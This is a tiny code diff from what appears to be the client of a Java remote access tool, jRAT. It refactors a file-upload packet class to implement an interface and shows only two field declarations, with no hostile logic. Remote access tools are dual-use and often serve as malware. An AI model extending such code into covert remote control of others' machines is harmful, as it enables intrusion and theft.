@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet29ClientUploadPart extends AbstractOutgoingPacket {
+public class Packet29ClientUploadPart implements OutgoingPacket {
 
 	private String file;
 	private byte[] part;
